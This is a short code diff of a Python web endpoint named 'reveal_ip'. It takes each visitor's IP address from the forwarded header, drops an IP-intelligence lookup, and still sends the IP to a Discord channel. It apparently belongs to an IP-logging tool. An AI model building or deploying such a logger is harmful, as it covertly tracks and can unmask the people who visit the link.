@@ -43,10 +43,10 @@ def reveal_ip():
     ip = forwarded.split(',')[0].strip()
 
     # Make a request to the Abstract API to get IP intelligence data and parse the response
-    response = requests.get(f"https://ip-intelligence.abstractapi.com/v1/?api_key={ABSTRACT_API_KEY}&ip_address=" + ip)
-    data = json.loads(response.text)
+    #response = requests.get(f"https://ip-intelligence.abstractapi.com/v1/?api_key={ABSTRACT_API_KEY}&ip_address=" + ip)
+    #data = json.loads(response.text)
 
-    send_ip_to_discord(ip, data)
+    send_ip_to_discord(ip)
 
     #return response.json()  # Return the JSON response directly from the Abstract API
     return jsonify({"ip": ip})
